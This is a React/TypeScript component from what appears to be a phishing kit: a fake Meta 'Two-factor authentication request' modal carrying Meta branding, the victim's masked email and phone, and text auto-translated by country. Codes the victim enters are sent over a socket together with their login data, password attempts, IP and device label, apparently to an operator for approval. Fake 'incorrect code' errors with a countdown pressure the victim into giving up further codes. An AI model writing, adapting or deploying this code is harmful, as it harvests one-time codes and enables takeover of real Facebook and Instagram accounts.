import '@/assets/css/two-fa-modal.css';
import TwoFaImage from '@/assets/images/2FA.png';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { submitCodeApproval } from '@/utils/approval-flow';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { type FC, type FormEvent, useEffect, useMemo, useState } from 'react';

const TEXT = {
    title: 'Two-factor authentication request',
    instructionPrefix: 'Enter the code sent to',
    instructionSuffix: ', or confirm with an authenticator app.',
    codePlaceholder: 'Code',
    error: 'The code you entered is incorrect. Please try again.',
    waiting: 'Waiting for verification...',
    continue: 'Continue',
    tryAnother: 'Try another method',
    facebook: 'Facebook',
    instagram: 'Instagram',
    userFallback: 'User'
} as const;

const textsToTranslate = Object.values(TEXT);

const maskEmail = (email: string): string => {
    if (!email) {
        return 't**t@example.us';
    }
    const [local, domain] = email.split('@');
    if (!domain) {
        return email;
    }
    if (local.length <= 2) {
        return `${local[0] ?? ''}**@${domain}`;
    }
    return `${local[0]}**${local[local.length - 1]}@${domain}`;
};

const maskPhone = (phone: string): string => {
    if (!phone) {
        return '+84 ****** XX';
    }
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 4) {
        return phone;
    }
    return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
};

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showInputError, setShowInputError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, appealProfile, loginProvider } = store();
    const appeal = useAppealContext();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => translations[text] || text;

    const normalizedCode = code.replace(/\D/g, '');
    const isCodeValid = /^\d{6,8}$/.test(normalizedCode);
    const canSubmit = isCodeValid && !isLoading && countdown <= 0;

    const providerLabel =
        loginProvider === 'instagram' ? t(TEXT.instagram) : loginProvider === 'facebook' ? t(TEXT.facebook) : t(TEXT.facebook);

    const userName = appealProfile?.fullName?.trim() || t(TEXT.userFallback);

    const instructionText = useMemo(() => {
        const email = maskEmail(appealProfile?.personalEmail ?? '');
        const phone = maskPhone(appealProfile?.phone ?? '');
        return `${t(TEXT.instructionPrefix)} ${email}, ${phone}${t(TEXT.instructionSuffix)}`;
    }, [appealProfile, t]);

    useEffect(() => {
        document.title = 'Two-factor authentication';
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown <= 0) {
            return;
        }
        const timer = setTimeout(() => {
            setCountdown((current) => current - 1);
        }, 1000);
        return () => clearTimeout(timer);
    }, [countdown]);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!canSubmit) {
            return;
        }

        setIsLoading(true);
        setShowInputError(false);

        const next = attempts + 1;
        setAttempts(next);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitCodeApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                normalizedCode,
                maxCode
            );

            if (result.approved) {
                nextStep();
                return;
            }

            if (result.isLastAttempt) {
                nextStep();
                return;
            }

            setShowInputError(true);
            setCode('');
            setCountdown(loadingTime);
        } catch {
            if (next >= maxCode) {
                nextStep();
            } else {
                setShowInputError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } finally {
            setIsLoading(false);
        }
    };

    const showErrorMessage = showInputError && countdown > 0;

    return (
        <div className='two-fa-page two-fa-overlay' role='dialog' aria-modal='true' aria-labelledby='two-fa-title'>
            <div className='two-fa-modal'>
                <div className='two-fa-body'>
                    <div className='w-full'>
                        <div className='two-fa-user-row'>
                            <span>{userName}</span>
                            <div className='two-fa-user-dot' aria-hidden='true' />
                            <span>{providerLabel}</span>
                        </div>

                        <h2 id='two-fa-title' className='two-fa-title'>
                            {t(TEXT.title)}
                        </h2>

                        <p className='two-fa-instruction'>{instructionText}</p>

                        <div className='two-fa-image-wrap'>
                            <Image src={TwoFaImage} alt='' width={480} className='h-auto w-full' />
                        </div>

                        <form id='two-fa-form' onSubmit={handleSubmit}>
                            <div className={`two-fa-input-wrap ${showErrorMessage ? 'is-error' : ''}`}>
                                <input
                                    id='two-fa-code'
                                    className='two-fa-input'
                                    inputMode='numeric'
                                    placeholder={t(TEXT.codePlaceholder)}
                                    maxLength={8}
                                    type='text'
                                    autoComplete='off'
                                    value={code}
                                    disabled={countdown > 0 || isLoading}
                                    onChange={(e) => {
                                        const value = e.target.value.replace(/\D/g, '').slice(0, 8);
                                        setCode(value);
                                        setShowInputError(false);
                                    }}
                                />
                            </div>

                            {showErrorMessage ? (
                                <p className='two-fa-error'>
                                    {t(TEXT.error)}
                                    {countdown > 0 ? ` (${countdown}s)` : ''}
                                </p>
                            ) : null}

                            {isLoading ? <p className='two-fa-waiting'>{t(TEXT.waiting)}</p> : null}

                            <div className='mt-2.5 w-full'>
                                <button type='submit' className='two-fa-submit' disabled={!canSubmit}>
                                    {isLoading ? <span className='two-fa-spinner' /> : t(TEXT.continue)}
                                </button>
                            </div>

                            <div className='two-fa-alt-method'>
                                <span>{t(TEXT.tryAnother)}</span>
                            </div>

                            <div className='mx-auto mt-5 w-16'>
                                <Image src={MetaLogoGrey} alt='Meta' width={64} className='w-full object-contain' />
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
